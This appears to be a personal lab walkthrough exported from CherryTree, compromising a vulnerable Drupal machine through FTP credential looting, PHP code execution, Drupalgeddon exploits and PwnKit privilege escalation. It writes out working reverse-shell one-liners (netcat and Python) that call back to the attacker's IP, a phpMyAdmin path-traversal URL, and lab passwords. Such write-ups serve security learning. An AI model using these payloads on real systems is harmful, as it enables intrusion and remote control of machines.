<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>drup machine</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>drup machine</h1><br/><p># I discovered the target machine on my network utilizing netdiscover</p><p> sudo netdiscover -P -i eth0 -r 10.0.0.0/24</p><p> </p><p>  # After my initial port scan on the target machine I was able to identify two open ports. 22 and 80. ftp and http respectivly.</p><p> nmap -p- &lt;ip address&gt;</p><p>  </p><p> # After discovering the initial ports I started an indepth nmap scan to enumerate service version and potential basic vulnerabilities with the scripted scan built into nmap. The results of this indepth scan presented that I would be able to log into ftp anonymously.</p><p> nmap -p 21,80 -sC -sV 10.0.0.168</p><p>  </p><p> # With the above information I began brute forcing directories and scanning for basic web vulnerbilities utilizing dirb and nikto.</p><p></p><p># While the dirb and nikto and running I logged into the ftp service with <span style="color:#e01b24;">anonymous:anonymous</span> credentials to see if I am able to retreive the passwords.zip file.</p><p>ftp &lt;ip address&gt;</p><p>ls</p><p>mget *</p><p># Unable to move around in file system</p><p></p><p># Since I was able to extract the files on the ftp server I attempted to unzip the passwords.zip file to see the contents, as well as read the welcome.msg and look at the .jpg.</p><p></p><p># The .zip file contained credentials and the welcome message just pointed out that they were trying out the ftp server.</p><p>unzip passwords.zip</p><p>cat passwords.txt</p><p></p><p># We now have credentials </p><p><span style="color:#e01b24;">drupaladmin:m1nty22</span></p><p><span style="color:#e01b24;">marcus:qwer</span></p><p></p><p># We can open to look at the picture</p><p></p><p>open ‘marcus aurelius.jpeg’</p><p>#cat welcome.msg  </p><p></p><p># With the credentials, maybe we can log into ftp with a higher privledge user and obtain more information.</p><p></p><p># Was unable to log into ftp using marcus:qwer</p><p>ftp marcus@10.0.0.83</p><p></p><p># We were able to successfully log into the ftp server with <span style="color:#e01b24;">drupaladmin:m1nty22</span> and are in the /opt/drupaladmin directory on the target system.</p><p>list all files</p><p># Was able to download history files from the /opt/drupaladmin directory</p><p></p><p></p><p># We are able to cd around the file system with this ftp session. I was able to cd to the /home directory and see a directory called test. While enumeration the /home/test directory I noticed many files on pointing to drupal-7.57 and multiple password files. There was a backup directory that had yet another password file in it.</p><p></p><p># Found another picture of marcus aurelius and some more files</p><p></p><p># We know that drupal is a CMS so it has default setting/config files that could contain hard coded database credentials. Utilizing some googling I was able to determine the location of the file. (default settings file for drupal)</p><p></p><p># I was able to crawl around the file system in this ftp connection and found a CHANGELOG.txt file and yet another directory that points to drupal in the /var/www/html directory. I believe the http port is hosting a drupal CMS site. Going to verify this information as there are default settings files located in CMS web site builders.</p><p></p><p># Downloaded the CHANGELOG.txt file to see if this was the correct version of drupal running.</p><p></p><p># After visiting the http page I am able to discover the username I logged into ftp with and a notice that the site is hosted using drupal.</p><p># While viewing the page source I was able to determine that this site is hosted using drupal 7.</p><p># Was able to identify nodes/posts on the website.</p><p></p><p># Are we able to utilize this node calling for LFI or command execution?? I was able to find and download the settings.php file from /var/www/html/sites/default/settings.php</p><p></p><p># Reviewing the files we have collected through our ftp connection, </p><p></p><p># I was able to find hard coded credentials in the settings.php file. I now have credentials to the database that drupal is built on.</p><p><img src="images/20-1.png" alt="images/20-1.png" /></p><p><h1>drupaladmin:P@55</h1></p><p></p><p># The rest of the password files that I was able to collect in the /home/test directory on the machine contained duplicate information about credentials.</p><p></p><p></p><p># The changelog file shows me drupals exact version. 7.57</p><p><img src="images/20-2.png" alt="images/20-2.png" /></p><p></p><p># A quick google search provided 4 potential exploits for our drupal version.</p><p></p><p></p><p><a href="https://www.acunetix.com/vulnerabilities/web/drupal-core-7-x-remote-code-execution-7-0-7-57/">https://www.acunetix.com/vulnerabilities/web/drupal-core-7-x-remote-code-execution-7-0-7-57/</a></p><p><a href="https://github.com/pimps/CVE-2018-7600">https://github.com/pimps/CVE-2018-7600</a></p><p><a href="https://github.com/dreadlocked/Drupalgeddon2">https://github.com/dreadlocked/Drupalgeddon2</a></p><p><a href="https://www.exploit-db.com/exploits/44449">https://www.exploit-db.com/exploits/44449</a></p><p></p><p># Utilizing service version from the nmap scan I looked for more potential low hanging fruit exploits/vulnerabilities.</p><p></p><p></p><p><a href="https://www.exploit-db.com/exploits/36742">https://www.exploit-db.com/exploits/36742</a></p><p><a href="https://www.exploit-db.com/exploits/49908">https://www.exploit-db.com/exploits/49908</a></p><p><a href="https://www.rapid7.com/db/modules/exploit/unix/ftp/proftpd_modcopy_exec/">https://www.rapid7.com/db/modules/exploit/unix/ftp/proftpd_modcopy_exec/</a></p><p></p><p><img src="images/20-3.png" alt="images/20-3.png" /></p><p></p><p><a href="https://www.exploit-db.com/exploits/40142">https://www.exploit-db.com/exploits/40142</a></p><p><a href="https://github.com/thehackersbrain/CVE-2021-41773">https://github.com/thehackersbrain/CVE-2021-41773</a></p><p><a href="https://github.com/jbovet/CVE-2021-41773">https://github.com/jbovet/CVE-2021-41773</a></p><p></p><p># Potential local root privilege escalation</p><p><a href="https://github.com/cfreal/exploits/blob/master/CVE-2019-0211-apache/README.md">https://github.com/cfreal/exploits/blob/master/CVE-2019-0211-apache/README.md</a></p><p></p><p></p><p># Attempted some basic SQLI to see if the login panel was unsanitized. Quotes or comment markers were not presenting any sort of database error.</p><p></p><p></p><p># Starting some webpage enumeration.</p><p></p><p># Default credentials admin:admin, admin:password did not work on this user login portal. Nor did drupaladmin:m1nty22 or marcus:qwer. I was however able to log into the portal utilizing the credentials found in the settings.php file. </p><p><span style="color:#e01b24;">drupaladmin:P@55</span></p><p></p><p></p><p># On the dashboard I am able to see posts that my user has created.</p><p></p><p></p><p># I am able to create a new article and upload a file. I will attempt to upload a php reverse shell as drupal is a LAMP stack and uses PHP.</p><p><img src="images/20-4.png" alt="images/20-4.png" /></p><p></p><p></p><p># Got an error when trying to upload a .php file. It will only accept .png, .gif, .jpg or .jpeg</p><p><img src="images/20-5.png" alt="images/20-5.png" /></p><p></p><p># Utilizing burpsuite I will intercept the .jpg upload now that it has bypassed the file extension restriction and modify the post packet before sending it to the server.  I modify the extension and remove .jpg from the file replacing it with .php and forward the packet.</p><p></p><p># The file was appended with .txt once we attempted a file upload.</p><p><a href="https://www.drupal.org/docs/7/howtos/add-php-code-to-the-body-of-a-drupal-7-block">https://www.drupal.org/docs/7/howtos/add-php-code-to-the-body-of-a-drupal-7-block</a></p><p></p><p># Following the information article I found above I enabled PHP module.</p><p><img src="images/20-6.png" alt="images/20-6.png" /></p><p># At the bottom save you configuration</p><p></p><p># We are now able to post PHP content into our article blog posts.</p><p>switch text format to php code</p><p></p><p></p><p><a href="https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985">https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985</a></p><p></p><p># I was able to build a basic system get command using PHP from the article above.</p><p><img src="images/20-7.png" alt="images/20-7.png" /></p><p></p><p># We received a bunch of errors on file upload but the article was posted successfully.</p><p></p><p># Testing if our php system request is being executed. Whoami command returns a user.</p><p></p><p></p><p># Also found an article about “Hiding in plain sight” talking about stegonagraphy. It looks like we could potentially use this to extract information from the image or .jpg file that we found on the ftp server earlier.</p><p></p><p><a href="https://www.merriam-webster.com/dictionary/steganography">https://www.merriam-webster.com/dictionary/steganography</a></p><p><a href="https://www.geeksforgeeks.org/how-to-install-steghide-tool-in-linux/">https://www.geeksforgeeks.org/how-to-install-steghide-tool-in-linux/</a></p><p><a href="https://exiftool.org/">https://exiftool.org/</a></p><p></p><p># I installed steghide following the instructions on steganography from the below link</p><p><a href="https://www.geeksforgeeks.org/how-to-install-steghide-tool-in-linux/">https://www.geeksforgeeks.org/how-to-install-steghide-tool-in-linux/</a></p><p></p><p></p><p># Utilizing steghide I was able to extract data from the picture file using the credentials we found in the password file that was in the ftp server.</p><p><h1>marcus : </h1><h1>qwer</h1></p><p></p><p># After sending an email to dominictrash@mail.com I received an automatic response.</p><p><img src="images/20-8.png" alt="images/20-8.png" /></p><p></p><p># Following the email instructions I found the phpmyadmin panel</p><p></p><p></p><p># Was unable to log in with admin:P@55word</p><p></p><p></p><p># With this being an internet facing MYSQL, we know that MYSQL default user is root. The note we received also contained a hint that when deciphered are “roots”. So we are able to determine the username is root.</p><p><h1>root:P@55word</h1></p><p></p><p># I was also able to log into the panel utilizing the same credentials that I found in the settings.php file. These were the same credentials used to log into the main retrain page. This is credentials reuse with a poor password.</p><p><h1>drupaladmin:P@55</h1></p><p></p><p># Within the phpmyadmin panel I was able to determine the php version.</p><p># Within the users table we are credentials </p><p># I was able to find a file upload under Import</p><p></p><p># With the file size limitation of 2048KB, we would not be able to upload our traditional php-reverse-shell.php file that has a size of 5492.</p><p></p><p># Went to google to find a tiny php reverse shell.</p><p></p><p><a href="https://gist.github.com/rshipp/eee36684db07d234c1cc">https://gist.github.com/rshipp/eee36684db07d234c1cc</a></p><p></p><p># Tried to make a tiny file, this file is well under the 2048 KB size limit. This file is 73 b</p><p><img src="images/20-9.png" alt="images/20-9.png" /></p><p></p><p></p><p># Still received an error when uploading this small file.</p><p></p><p># Googled for a phpmyadmin exploit for version 4.8.1</p><p></p><p><a href="https://www.exploit-db.com/exploits/50457">https://www.exploit-db.com/exploits/50457</a></p><p><a href="https://www.exploit-db.com/exploits/44928">https://www.exploit-db.com/exploits/44928</a></p><p></p><p># Attempting the syntax for the PoC LFI, but was presented with tons of errors.</p><p><a href="https://www.exploit-db.com/exploits/44928">https://www.exploit-db.com/exploits/44928</a></p><p><a href="http://10.0.0.83/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_11njnj4253qq93vjm9q93nvc7p2lq82k">http://10.0.0.83/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_11njnj4253qq93vjm9q93nvc7p2lq82k</a></p><p></p><p></p><p># Tried the other phpmyadmin exploit to return a session and it returned no output. Perhaps there is a mitigation inplace like moving the session default location?</p><p><a href="https://www.exploit-db.com/exploits/50457">https://www.exploit-db.com/exploits/50457</a></p><p><img src="images/20-10.png" alt="images/20-10.png" /></p><p></p><p># Attempted to create my own account on the main page and that account needs to be approved by the administrator.</p><p><a href="http://10.0.0.83/user/">http://10.0.0.83/user/</a></p><p></p><p># Testing node pages from 1-10 I was able to find the pages about stegonagraphy, welcome to the test, pointing us to the ftp server and the article that I had posted on /node/9. Nothing else added new information.</p><p></p><p></p><p># From our nikto scan we were able to find a few interesting files. /UPGRADE.txt and CHANGELOG.txt tells us about the major drupal version we are on as well as the phpmyadmin version respectivly. We have found this information in multiple places already.</p><p></p><p># Reviewed robots.txt to see if the site did not want any extra information crawled by web crawlers.</p><p></p><p># Attempted to view the /etc/passwd file using some potential LFI through php</p><p></p><p># All of these directories that would provide extra information on the site are forbidden.</p><p></p><p># Almost all results from dirb are forbidden pages that we are unable to view or gain any information from.</p><p></p><p><h1># Lets move onto EXPLOITATION</h1></p><p># Attempting some drupal exploits that we have collected during our enumeration phase.</p><p><a href="https://www.exploit-db.com/exploits/44449">https://www.exploit-db.com/exploits/44449</a></p><p><span style="color:#3584e4;"> ruby 44449.rb </span><a href="http://10.0.0.83">http://10.0.0.83</a></p><p> <img src="images/20-11.png" alt="images/20-11.png" /></p><p> </p><p> # We have limited functionality and are unable to move around in the directory file structure.</p><p> </p><p> # Trying to send myself a reverse shell using netcat and I am unable to due to it being netcat-openbsd package instead of netcat-traditional.</p><p> <a href="https://dharma-adiputra.medium.com/neutered-netcat-no-prob-1ac188449d1">https://dharma-adiputra.medium.com/neutered-netcat-no-prob-1ac188449d1</a></p><p>  </p><p> # Was able to send myself a reverse shell using the syntax provided in the article above after starting a listener on my kali.</p><p> mkfifo a</p><p> cat a | /bin/bash | nc 10.0.0.194 4444 | tee a</p><p> <img src="images/20-12.png" alt="images/20-12.png" /></p><p> start a lsitener</p><p> </p><p> # We could also send ourselves reverse shells by generating a shell or using python.</p><p> <a href="https://www.revshells.com/">https://www.revshells.com/</a></p><p> <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python</a></p><p> </p><p><span style="color:#3584e4;"> python -c &#39;import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.194&quot;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&quot;/bin/bash&quot;)&#39;</span></p><p> </p><p> # Going to try the other drupal exploit that we have found.</p><p><a href="https://github.com/pimps/CVE-2018-7600">https://github.com/pimps/CVE-2018-7600</a></p><p></p><p><h1># Going to use metasploit for fun too!</h1></p><p><img src="images/20-13.png" alt="images/20-13.png" /></p><p><img src="images/20-14.png" alt="images/20-14.png" /></p><p><img src="images/20-15.png" alt="images/20-15.png" /></p><p><img src="images/20-16.png" alt="images/20-16.png" /></p><p># Got a shell using metasploit </p><p><img src="images/20-17.png" alt="images/20-17.png" /></p><p></p><p># We are able to switch to user drupaladmin due to poor password hygine/ password reuse.</p><p><img src="images/20-18.png" alt="images/20-18.png" /></p><p><h1>drupaladmin:m1nty22</h1></p><p># drupaladmin does not have sudo privs</p><p><img src="images/20-19.png" alt="images/20-19.png" /></p><p></p><p># Unable to switch to root using P@55word</p><p><img src="images/20-20.png" alt="images/20-20.png" /></p><p></p><p># Collected kernel information utilizing the &quot;uname -a&quot; command and was able to find an exploit, download it to kali, host a server, move it over to the target machine, compile it and run it.</p><p><img src="images/20-21.png" alt="images/20-21.png" /></p><p><a href="https://www.exploit-db.com/exploits/41458">https://www.exploit-db.com/exploits/41458</a></p><p><img src="images/20-22.png" alt="images/20-22.png" /></p><p><img src="images/20-23.png" alt="images/20-23.png" /></p><p><img src="images/20-24.png" alt="images/20-24.png" /></p><p></p><p># Moved an SUIDenumeration script to the drup machine to find and present potential SUID bits set on commands for exploitation.</p><p><img src="images/20-25.png" alt="images/20-25.png" /></p><p></p><p><img src="images/20-26.png" alt="images/20-26.png" /></p><p><img src="images/20-27.png" alt="images/20-27.png" /></p><p><img src="images/20-28.png" alt="images/20-28.png" /></p><p></p><p></p><p># Checking SUID bits on GTFObins</p><p><a href="https://gtfobins.github.io/gtfobins/python/">https://gtfobins.github.io/gtfobins/python/</a></p><p>python3 -c &#39;import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;)&#39;</p><p><img src="images/20-29.png" alt="images/20-29.png" /></p><p></p><p><a href="https://gtfobins.github.io/gtfobins/env/">https://gtfobins.github.io/gtfobins/env/</a></p><p><img src="images/20-30.png" alt="images/20-30.png" /></p><p></p><p># Moved linpeas onto the drup machine to enumerate more extensivly from a hosted server running on my kali.</p><p><img src="images/20-31.png" alt="images/20-31.png" /></p><p></p><p><img src="images/20-32.png" alt="images/20-32.png" /></p><p><img src="images/20-33.png" alt="images/20-33.png" /></p><p><img src="images/20-34.png" alt="images/20-34.png" /></p><p><img src="images/20-35.png" alt="images/20-35.png" /></p><p><img src="images/20-36.png" alt="images/20-36.png" /></p><p><img src="images/20-37.png" alt="images/20-37.png" /></p><p><img src="images/20-38.png" alt="images/20-38.png" /></p><p></p><p><img src="images/20-39.png" alt="images/20-39.png" /></p><p><img src="images/20-40.png" alt="images/20-40.png" /></p><p><img src="images/20-41.png" alt="images/20-41.png" /></p><p></p><p><img src="images/20-42.png" alt="images/20-42.png" /></p><p></p><p></p><p># </p><p><img src="images/20-43.png" alt="images/20-43.png" /></p><p></p><p></p><p># With the linpeas results I downloaded the PwnKit kernel exploit moved to kali, hosted a server which I downloaded the .c file to drup and compiled. The exploit provided a new root shell.</p><p><a href="https://github.com/ly4k/PwnKit">https://github.com/ly4k/PwnKit</a></p><p><img src="images/20-44.png" alt="images/20-44.png" /></p><p></p></div>
</body>
</html>
